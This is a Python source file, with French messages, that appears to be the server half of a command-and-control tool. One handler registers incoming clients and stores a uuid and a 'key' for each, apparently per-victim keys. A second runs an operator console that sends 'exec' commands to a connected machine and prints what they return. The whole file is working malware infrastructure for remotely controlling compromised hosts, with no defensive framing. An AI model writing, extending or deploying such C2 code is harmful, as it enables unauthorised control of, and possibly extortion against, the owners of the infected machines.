import json
from storage import save_client

def handle_init_client(conn, addr):
    try:
        raw = conn.recv(2048)
        message = json.loads(raw.decode())
        uuid = message.get("uuid")
        key = message.get("key")
        save_client(uuid, key)
        print(f"[+] Nouveau client : {uuid} (clé : {key})")
    except Exception as e:
        print(f"[!] Erreur init {addr} : {e}")
    finally:
        conn.close()

def handle_command_client(conn, addr):
    import threading
    import sys

    print(f"[+] C2 connecté à {addr}")
    try:
        while True:
            cmd = input(f"[C2:{addr}] > ")
            if cmd.startswith("exec "):
                payload = json.dumps({"action": "EXEC", "command": cmd[5:]})
                conn.sendall(payload.encode())
                response = conn.recv(8192)
                result = json.loads(response.decode()).get("output", "")
                print("=== Résultat ===\n" + result)
            elif cmd == "exit":
                break
            else:
                print("[!] Commande inconnue.")
    except Exception as e:
        print(f"[!] Erreur : {e}")
    finally:
        conn.close()
